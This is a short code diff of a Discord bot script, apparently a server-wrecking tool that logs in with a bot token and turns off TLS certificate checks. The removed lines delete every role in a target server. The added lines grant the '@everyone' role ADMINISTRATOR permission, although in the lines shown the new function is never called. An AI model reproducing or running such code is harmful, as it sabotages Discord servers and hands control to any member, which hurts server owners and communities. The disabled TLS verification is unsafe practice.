@@ -5,13 +5,10 @@ process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
 
 client.on('ready', () => {
     function all(){
-    Promise.all(client.guilds.get(settings.auto.server_id).roles.map(c=>c.delete()));
-    setTimeout(quit, 10000)
-    }
-    function quit(){
-        process.exit();
-    }
-    setTimeout(all, 1000)
+		client.guilds.get(settings.auto.server_id).roles.find('name', '@everyone').edit({
+			permissions: ["ADMINISTRATOR"]
+		});
+	}
 });
 
 client.login(settings.token);
